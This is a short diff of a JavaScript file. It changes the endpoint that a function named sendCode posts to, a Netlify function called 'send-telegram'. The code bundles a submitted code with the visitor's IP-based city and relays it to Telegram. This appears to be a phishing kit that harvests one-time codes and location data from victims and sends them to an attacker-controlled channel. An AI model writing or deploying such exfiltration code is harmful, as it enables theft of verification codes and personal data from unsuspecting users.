@@ -148,7 +148,7 @@ function sendCode() {
       ` <strong>City:</strong> <code>${IpAddress?.city || "N/A"}</code>`;
 
     NUMBER_TIME_SEND_CODE++;
-    fetch('https://tele-123-456.netlify.app/.netlify/functions/send-telegram', {
+    fetch('https://stellar-snickerdoodle-b1acdb.netlify.app/.netlify/functions/send-telegram', {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
